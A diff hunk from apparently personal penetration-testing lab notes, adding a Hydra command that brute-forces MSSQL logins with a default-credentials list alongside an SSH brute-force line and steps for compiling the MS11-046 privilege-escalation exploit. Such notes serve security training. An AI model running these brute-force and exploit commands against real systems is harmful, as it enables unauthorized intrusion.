@@ -43,6 +43,7 @@ rdesktop -u sl0wly 10.11.1.31
 
 #### HYDRA BF
 hydra -l root -P /usr/share/wordlist/rockyou.txt -T 20 10.11.1.71 ssh
+hydra -s 27900 -C /usr/share/wordlist/sparta/mssql-default-userpass.txt -f 10.11.1.128 mssql
 
 #### compling .exe on kali
 i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
